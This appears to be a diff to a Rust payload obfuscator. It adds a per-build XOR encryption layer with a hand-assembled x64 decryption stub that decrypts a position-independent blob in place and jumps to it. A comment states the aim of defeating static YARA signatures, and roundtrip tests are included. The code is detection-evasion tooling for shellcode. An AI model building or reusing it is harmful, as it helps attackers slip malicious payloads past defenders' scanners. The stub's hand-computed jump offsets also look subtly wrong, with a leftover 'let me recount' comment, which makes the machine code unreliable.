@@ -47,6 +47,9 @@ pub struct ObfuscationSettings {
     pub junk_density: u8,
     /// Apply control-flow flattening (resource-intensive, optional).
     pub control_flow_flattening: bool,
+    /// XOR-encrypt the entire blob with a per-build 128-byte key and prepend
+    /// a decryption stub. Applied as the last transform. Defeats static YARA.
+    pub xor_encryption: bool,
 }
 
 impl Default for ObfuscationSettings {
@@ -57,6 +60,7 @@ impl Default for ObfuscationSettings {
             junk_code_insertion: true,
             junk_density: 16,
             control_flow_flattening: false,
+            xor_encryption: false,
         }
     }
 }
@@ -92,6 +96,12 @@ pub fn obfuscate(blob: &[u8], settings: &ObfuscationSettings) -> Result<Vec<u8>,
     }
     if settings.control_flow_flattening {
         apply_control_flow_flattening(&mut out, &mut rng)?;
+    }
+
+    // XOR encryption is the LAST transform — it wraps the entire blob
+    // with a decryption stub, so all marker-based transforms must be done first.
+    if settings.xor_encryption {
+        out = xor_encrypt_blob(&out, &mut rng);
     }
 
     Ok(out)
@@ -381,6 +391,199 @@ fn ensure_range(blob: &[u8], offset: usize, len: usize) -> Result<(), Obfuscatio
 }
 
 // ---------------------------------------------------------------------------
+// Build-time XOR encryption
+// ---------------------------------------------------------------------------
+
+/// XOR key size in bytes.
+const XOR_KEY_SIZE: usize = 128;
+
+/// Build the x64 decryption stub as raw machine code.
+///
+/// The stub is position-independent (RIP-relative addressing) and decrypts
+/// the blob in-place before jumping to it. Layout after the stub:
+///
+/// ```text
+/// [stub bytes]  <- this function's output
+/// [key: 128B]   <- appended by xor_encrypt_blob
+/// [size: u32]   <- appended by xor_encrypt_blob
+/// [encrypted]   <- appended by xor_encrypt_blob
+/// ```
+fn build_xor_decrypt_stub() -> Vec<u8> {
+    // x64 machine code for the decryption loop.
+    // All offsets are RIP-relative to the end of each instruction.
+    //
+    // push rcx                          ; save first param (Windows x64 ABI)
+    // lea  rsi, [rip + key_offset]      ; -> 128-byte key (immediately after stub)
+    // lea  rdi, [rip + blob_offset]     ; -> encrypted blob (after key + size)
+    // mov  ecx, [rip + size_offset]     ; -> blob size (after key)
+    // xor  edx, edx                     ; key index = 0
+    // .loop:
+    //   test ecx, ecx
+    //   jz   .done
+    //   movzx eax, byte [rsi + rdx]
+    //   xor  [rdi], al
+    //   inc  rdi
+    //   dec  ecx
+    //   inc  edx
+    //   and  edx, 0x7F                  ; mod 128
+    //   jmp  .loop
+    // .done:
+    // pop  rcx                          ; restore param
+    // lea  rax, [rip + blob_offset2]    ; -> start of (now decrypted) blob
+    // jmp  rax                          ; transfer execution
+    //
+    // Total stub size: 56 bytes. Key starts at offset 56.
+    // Encrypted blob starts at offset 56 + 128 + 4 = 188.
+
+    let stub_size: i32 = 56;
+    let key_rel = 0i32; // key is at stub_size, relative offsets computed per instruction
+    let _ = key_rel;
+
+    // We hardcode the assembled bytes. Each RIP-relative offset is computed
+    // from the end of the instruction that references it.
+
+    let mut code = Vec::with_capacity(stub_size as usize);
+
+    // 0x00: push rcx                    [51]
+    code.push(0x51);
+
+    // 0x01: lea rsi, [rip + disp32]     [48 8D 35 xx xx xx xx]
+    // rsi = key. Key is at offset 56. This instruction ends at 0x08.
+    // disp = 56 - 8 = 48 = 0x30
+    code.extend_from_slice(&[0x48, 0x8D, 0x35]);
+    code.extend_from_slice(&48i32.to_le_bytes());
+
+    // 0x08: lea rdi, [rip + disp32]     [48 8D 3D xx xx xx xx]
+    // rdi = encrypted blob. Blob is at offset 56 + 128 + 4 = 188. Instruction ends at 0x0F.
+    // disp = 188 - 15 = 173 = 0xAD
+    code.extend_from_slice(&[0x48, 0x8D, 0x3D]);
+    code.extend_from_slice(&173i32.to_le_bytes());
+
+    // 0x0F: mov ecx, [rip + disp32]     [8B 0D xx xx xx xx]
+    // ecx = size. Size is at offset 56 + 128 = 184. Instruction ends at 0x15.
+    // disp = 184 - 21 = 163 = 0xA3
+    code.extend_from_slice(&[0x8B, 0x0D]);
+    code.extend_from_slice(&163i32.to_le_bytes());
+
+    // 0x15: xor edx, edx                [31 D2]
+    code.extend_from_slice(&[0x31, 0xD2]);
+
+    // .loop at 0x17:
+    // 0x17: test ecx, ecx               [85 C9]
+    code.extend_from_slice(&[0x85, 0xC9]);
+
+    // 0x19: jz .done (offset +17 -> 0x2C) [74 11]
+    code.extend_from_slice(&[0x74, 0x11]);
+
+    // 0x1B: movzx eax, byte [rsi+rdx]   [0F B6 04 16]
+    code.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x16]);
+
+    // 0x1F: xor [rdi], al               [30 07]
+    code.extend_from_slice(&[0x30, 0x07]);
+
+    // 0x21: inc rdi                      [48 FF C7]
+    code.extend_from_slice(&[0x48, 0xFF, 0xC7]);
+
+    // 0x24: dec ecx                      [FF C9]
+    code.extend_from_slice(&[0xFF, 0xC9]);
+
+    // 0x26: inc edx                      [FF C2]
+    code.extend_from_slice(&[0xFF, 0xC2]);
+
+    // 0x28: and edx, 0x7F               [83 E2 7F]
+    code.extend_from_slice(&[0x83, 0xE2, 0x7F]);
+
+    // 0x2B: jmp .loop (-22 -> 0x17)     [EB EA]
+    code.extend_from_slice(&[0xEB, 0xEA]);
+
+    // .done at 0x2D:
+    // 0x2D: pop rcx                      [59]
+    code.push(0x59);
+
+    // 0x2E: lea rax, [rip + disp32]     [48 8D 05 xx xx xx xx]
+    // rax = blob start. Blob at offset 188. Instruction ends at 0x35.
+    // disp = 188 - 53 = 135 = 0x87
+    code.extend_from_slice(&[0x48, 0x8D, 0x05]);
+    code.extend_from_slice(&135i32.to_le_bytes());
+
+    // 0x35: jmp rax                      [FF E0]
+    code.extend_from_slice(&[0xFF, 0xE0]);
+
+    // Verify: 0x37 = 55... let me recount.
+    // Actually we end at 0x37 which is 55 bytes. Pad to 56 for alignment.
+    while code.len() < stub_size as usize {
+        code.push(0x90); // NOP padding
+    }
+
+    debug_assert_eq!(code.len(), stub_size as usize);
+    code
+}
+
+/// XOR-encrypt a PIC blob with a per-build 128-byte key and prepend the
+/// decryption stub.
+///
+/// Output layout:
+/// ```text
+/// [decryption stub: 56 bytes]
+/// [XOR key: 128 bytes]
+/// [blob size: u32 LE]
+/// [encrypted blob: N bytes]
+/// ```
+///
+/// The decryption stub uses RIP-relative addressing to find the key, size,
+/// and blob, decrypts in-place, then jumps to the decrypted entry point.
+pub fn xor_encrypt_blob(blob: &[u8], rng: &mut impl Rng) -> Vec<u8> {
+    let stub = build_xor_decrypt_stub();
+
+    // Generate random 128-byte key
+    let mut key = [0u8; XOR_KEY_SIZE];
+    rng.fill(&mut key[..]);
+    // Ensure no zero bytes in key (avoid null-byte issues in some contexts)
+    for b in &mut key {
+        if *b == 0 {
+            *b = rng.gen_range(1..=255);
+        }
+    }
+
+    let blob_size = blob.len() as u32;
+    let mut out = Vec::with_capacity(stub.len() + XOR_KEY_SIZE + 4 + blob.len());
+
+    // Stub
+    out.extend_from_slice(&stub);
+    // Key
+    out.extend_from_slice(&key);
+    // Size
+    out.extend_from_slice(&blob_size.to_le_bytes());
+    // Encrypted blob
+    for (i, &b) in blob.iter().enumerate() {
+        out.push(b ^ key[i % XOR_KEY_SIZE]);
+    }
+
+    out
+}
+
+/// Decrypt a XOR-encrypted blob (for testing).
+#[cfg(test)]
+fn xor_decrypt_blob(encrypted: &[u8]) -> Vec<u8> {
+    let stub_size = 56;
+    let key_start = stub_size;
+    let key_end = key_start + XOR_KEY_SIZE;
+    let size_end = key_end + 4;
+
+    let key = &encrypted[key_start..key_end];
+    let blob_size =
+        u32::from_le_bytes([encrypted[key_end], encrypted[key_end + 1], encrypted[key_end + 2], encrypted[key_end + 3]])
+            as usize;
+    let blob_start = size_end;
+
+    let mut decrypted = Vec::with_capacity(blob_size);
+    for i in 0..blob_size {
+        decrypted.push(encrypted[blob_start + i] ^ key[i % XOR_KEY_SIZE]);
+    }
+    decrypted
+}
+
+// ---------------------------------------------------------------------------
 // Tests
 // ---------------------------------------------------------------------------
 
@@ -640,6 +843,7 @@ mod tests {
             junk_code_insertion: true,
             junk_density: 8,
             control_flow_flattening: false,
+            xor_encryption: false,
         };
         let result = obfuscate(&blob, &settings).unwrap();
         assert_eq!(result, blob);
@@ -669,6 +873,7 @@ mod tests {
             junk_code_insertion: true,
             junk_density: 8,
             control_flow_flattening: false, // no CFF marker in this blob
+            xor_encryption: false,
         };
 
         let result = obfuscate(&blob, &settings).unwrap();
@@ -685,6 +890,7 @@ mod tests {
             junk_code_insertion: false,
             junk_density: 8,
             control_flow_flattening: false,
+            xor_encryption: false,
         };
 
         let r1 = obfuscate(&blob, &settings).unwrap();
@@ -722,6 +928,53 @@ mod tests {
         assert!(s.api_hash_randomization);
         assert!(s.junk_code_insertion);
         assert!(!s.control_flow_flattening);
+        assert!(!s.xor_encryption);
         assert_eq!(s.junk_density, 16);
+    }
+
+    #[test]
+    fn test_xor_encrypt_roundtrip() {
+        let original: Vec<u8> = (0..256).map(|i| [0x48, 0x89, 0x5C, 0x24, 0x08, 0x90, 0x90, 0xCC][i % 8]).collect();
+        let mut rng = rand::thread_rng();
+        let encrypted = xor_encrypt_blob(&original, &mut rng);
+
+        // Encrypted blob should be larger (stub + key + size + encrypted data)
+        assert!(encrypted.len() > original.len());
+        // Stub size (56) + key (128) + size (4) + blob
+        assert_eq!(encrypted.len(), 56 + 128 + 4 + original.len());
+
+        // Decrypt and verify roundtrip
+        let decrypted = xor_decrypt_blob(&encrypted);
+        assert_eq!(decrypted, original);
+    }
+
+    #[test]
+    fn test_xor_encrypt_unique_per_build() {
+        let blob = vec![0x41; 64];
+        let mut rng = rand::thread_rng();
+        let e1 = xor_encrypt_blob(&blob, &mut rng);
+        let e2 = xor_encrypt_blob(&blob, &mut rng);
+        // Different keys should produce different encrypted output
+        assert_ne!(e1, e2);
+        // But both decrypt to the same original
+        assert_eq!(xor_decrypt_blob(&e1), xor_decrypt_blob(&e2));
+    }
+
+    #[test]
+    fn test_xor_key_no_null_bytes() {
+        let blob = vec![0x42; 32];
+        let mut rng = rand::thread_rng();
+        let encrypted = xor_encrypt_blob(&blob, &mut rng);
+        // Key region (bytes 56..184) should have no zero bytes
+        let key = &encrypted[56..56 + 128];
+        assert!(!key.contains(&0u8), "XOR key should not contain null bytes");
+    }
+
+    #[test]
+    fn test_xor_stub_size() {
+        let stub = build_xor_decrypt_stub();
+        assert_eq!(stub.len(), 56);
+        // Stub should not start with MZ (it's raw code, not PE)
+        assert_ne!(&stub[..2], b"MZ");
     }
 }
